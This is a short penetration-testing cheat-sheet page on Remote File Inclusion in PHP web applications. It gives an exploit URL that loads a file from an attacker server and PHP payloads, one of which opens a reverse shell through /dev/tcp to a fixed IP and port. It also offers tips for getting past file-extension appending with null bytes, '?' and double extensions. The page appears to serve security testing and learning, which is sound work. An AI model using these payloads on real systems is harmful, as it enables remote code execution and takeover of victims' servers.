---
description: >-
  A remote file inclusion vulnerability allows an attacker to remotely execute a
  script on the victim even if it is not available locally.
---

# Remote File Inclusion

### Example

The following details some basic RFI exploitation examples:\`

`http://acme.com/index.php?page=http://attackerserver.com/evil.txt`\
\
This vulnerability can be easily exploited by either using a PHP shell available from `/usr/share/webshells/php`&#x20;

Alternatively, the following lists a few ways to test for RFI:

`<?php echo shell_exec("whoami");?>`

`<?php echo system("0<&196;exec 196<>/dev/tcp/10.11.0.191/443; sh <&196 >&196 2>&196"); ?>`

### Notes

As stated briefly in the [LFI section](local-file-inclusion-lfi.md)

It is important in some situations to add a nullbyte `%00` to avoid appending `.php` or another extension like `.config`

If this does not work you can also add a `?`, to ensure that the rest will be interpreted as URL parameters.

A dirty way of bypassing this is also to name your file with the extension, e.g., `evil.txt.php`
